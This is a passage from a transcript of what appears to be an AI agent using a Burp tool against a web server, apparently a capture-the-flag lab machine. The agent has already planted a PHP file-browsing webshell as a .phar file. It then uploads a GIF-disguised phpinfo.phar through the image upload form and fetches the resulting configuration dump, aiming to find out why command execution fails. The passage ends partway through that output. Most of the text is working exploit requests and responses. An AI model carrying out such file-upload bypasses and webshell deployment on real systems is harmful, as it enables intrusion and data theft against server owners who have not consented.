Date: Thu, 08 May 2025 00:59:09 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 718
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>PHP Info Shell</h1><h2>Server Information</h2><pre>PHP Version: 7.4.33
Server Software: Apache/2.4.55 (Ubuntu)
Server Name: 10.10.11.241
Document Root: /var/www/html
Current Script: /var/www/html/uploads/infoshell.phar
Server IP: 192.168.5.2
Remote IP: 10.10.14.236
</pre><h2>Directory Listing</h2><form method='POST'>Path: <input type='text' name='path' style='width:500px;' value='/var/www/html'><input type='submit' value='List Files'></form><h2>File Reader</h2><form method='POST'>File: <input type='text' name='file' style='width:500px;'><input type='submit' value='Read File'></form><h3>Reading: /var/www/html/.htaccess</h3><pre>AddType application/x-httpd-php .phar
</pre></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:59:10 PM (America/New_York, UTC-4:00)

# Context Window Usage
45,274 / 200K tokens used (23%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
The .htaccess file shows that .phar files are configured to be processed as PHP files, which is why our webshells are working. However, we still haven't been able to execute commands.

Let's check the PHP configuration to see if there are any disabled functions that might be preventing command execution. We can do this by creating a phpinfo() page:
</thinking>

Let's create a phpinfo page to check the PHP configuration and see if there are any disabled functions:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /upload.php HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: multipart/form-data; boundary=---------------------------12345678901234567890123456789\r\nContent-Length: 300\r\nConnection: close\r\n\r\n-----------------------------12345678901234567890123456789\r\nContent-Disposition: form-data; name=\"image\"; filename=\"phpinfo.phar\"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a;\r\n<?php\r\nphpinfo();\r\n?>\r\n-----------------------------12345678901234567890123456789--",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 302 Found
Date: Thu, 08 May 2025 00:59:16 GMT
Server: Apache/2.4.55 (Ubuntu)
Location: /success.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8


<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:59:17 PM (America/New_York, UTC-4:00)

# Context Window Usage
46,188 / 200K tokens used (23%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! The upload was successful. Now let's access the phpinfo page:
</thinking>

Now let's access the phpinfo page to see the PHP configuration:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "GET /uploads/phpinfo.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nConnection: close\r\n\r\n",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 00:59:19 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 73985

GIF89a;
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #fff; color: #222; font-family: sans-serif;}
pre {margin: 0; font-family: monospace;}
a:link {color: #009; text-decoration: none; background-color: #fff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
.center {text-align: center;}
.center table {margin: 1em auto; text-align: left;}
.center th {text-align: center !important;}
td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
th {position: sticky; top: 0; background: inherit;}
h1 {font-size: 150%;}
h2 {font-size: 125%;}
.p {text-align: left;}
.e {background-color: #ccf; width: 300px; font-weight: bold;}
.h {background-color: #99c; font-weight: bold;}
.v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
.v i {color: #999;}
img {float: right; border: 0;}
hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
</style>
<title>PHP 7.4.33 - phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
<body><div class="center">
<table>
<tr class="h"><td>
<a href="http://www.php.net/"><img border="0" src="data:image/png;base64,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" alt="PHP logo" /></a><h1 class="p">PHP Version 7.4.33</h1>
</td></tr>
</table>
<table>
<tr><td class="e">System </td><td class="v">Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 </td></tr>
<tr><td class="e">Build Date </td><td class="v">Sep  2 2023 08:03:46 </td></tr>
<tr><td class="e">Server API </td><td class="v">Apache 2.0 Handler </td></tr>
<tr><td class="e">Virtual Directory Support </td><td class="v">disabled </td></tr>
<tr><td class="e">Configuration File (php.ini) Path </td><td class="v">/etc/php/7.4/apache2 </td></tr>
<tr><td class="e">Loaded Configuration File </td><td class="v">/etc/php/7.4/apache2/php.ini </td></tr>
<tr><td class="e">Scan this dir for additional .ini files </td><td class="v">/etc/php/7.4/apache2/conf.d </td></tr>
<tr><td class="e">Additional .ini files parsed </td><td class="v">/etc/php/7.4/apache2/conf.d/10-mysqlnd.ini,
/etc/php/7.4/apache2/conf.d/10-opcache.ini,
/etc/php/7.4/apache2/conf.d/10-pdo.ini,
/etc/php/7.4/apache2/conf.d/20-calendar.ini,
/etc/php/7.4/apache2/conf.d/20-ctype.ini,
/etc/php/7.4/apache2/conf.d/20-exif.ini,
/etc/php/7.4/apache2/conf.d/20-ffi.ini,
/etc/php/7.4/apache2/conf.d/20-fileinfo.ini,
/etc/php/7.4/apache2/conf.d/20-ftp.ini,
/etc/php/7.4/apache2/conf.d/20-gettext.ini,
/etc/php/7.4/apache2/conf.d/20-iconv.ini,
/etc/php/7.4/apache2/conf.d/20-json.ini,
/etc/php/7.4/apache2/conf.d/20-mysqli.ini,
/etc/php/7.4/apache2/conf.d/20-pdo_mysql.ini,
/etc/php/7.4/apache2/conf.d/20-phar.ini,
/etc/php/7.4/apache2/conf.d/20-posix.ini,
/etc/php/7.4/apache2/conf.d/20-readline.ini,
/etc/php/7.4/apache2/conf.d/20-shmop.ini,
/etc/php/7.4/apache2/conf.d/20-sockets.ini,
/etc/php/7.4/apache2/conf.d/20-sysvmsg.ini,
/etc/php/7.4/apache2/conf.d/20-sysvsem.ini,
/etc/php/7.4/apache2/conf.d/20-sysvshm.ini,
/etc/php/7.4/apache2/conf.d/20-tokenizer.ini
 </td></tr>
<tr><td class="e">PHP API </td><td class="v">20190902 </td></tr>
<tr><td class="e">PHP Extension </td><td class="v">20190902 </td></tr>
<tr><td class="e">Zend Extension </td><td class="v">320190902 </td></tr>
<tr><td class="e">Zend Extension Build </td><td class="v">API320190902,NTS </td></tr>
<tr><td class="e">PHP Extension Build </td><td class="v">API20190902,NTS </td></tr>
<tr><td class="e">Debug Build </td><td class="v">no </td></tr>
<tr><td class="e">Thread Safety </td><td class="v">disabled </td></tr>
<tr><td class="e">Zend Signal Handling </td><td class="v">enabled </td></tr>
<tr><td class="e">Zend Memory Manager </td><td class="v">enabled </td></tr>
<tr><td class="e">Zend Multibyte Support </td><td class="v">disabled </td></tr>
<tr><td class="e">IPv6 Support </td><td class="v">enabled </td></tr>
<tr><td class="e">DTrace Support </td><td class="v">available, disabled </td></tr>
<tr><td class="e">Registered PHP Streams</td><td class="v">https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar</td></tr>
<tr><td class="e">Registered Stream Socket Transports</td><td class="v">tcp, udp, unix, udg, ssl, tls, tlsv1.0, tlsv1.1, tlsv1.2, tlsv1.3</td></tr>
<tr><td class="e">Registered Stream Filters</td><td class="v">zlib.*, string.rot13, string.toupper, string.tolower, string.strip_tags, convert.*, consumed, dechunk, convert.iconv.*</td></tr>
</table>
<table>
<tr class="v"><td>
<a href="http://www.zend.com/"><img border="0" src="data:image/png;base64,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